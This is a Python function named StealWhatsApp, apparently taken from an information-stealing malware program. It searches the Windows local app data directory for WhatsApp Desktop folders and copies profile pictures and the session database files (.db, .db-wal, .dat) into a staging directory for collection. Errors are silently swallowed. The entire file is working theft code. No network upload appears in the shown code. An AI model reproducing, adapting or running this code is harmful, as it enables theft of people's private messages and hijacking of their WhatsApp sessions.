import os
from pathlib import Path
import re
import shutil


async def StealWhatsApp(self, directory_path: str) -> None:
    try:
        whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
        os.makedirs(whatsapp_session, exist_ok=True)
        regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
        parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]

        for parent in parent_folders:
            local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
            for local_state_folder in local_state_folders:
                profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
                for profile_folder in profile_pictures_folders:
                    destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
                    os.makedirs(destination_path, exist_ok=True)
                    shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)

                files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
                for file in files_to_copy:
                    dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
                    os.makedirs(dest_folder, exist_ok=True)
                    shutil.copy(file, dest_folder)
                    
    except Exception as e:
        print(f"whatsapp error - {str(e)}")
        pass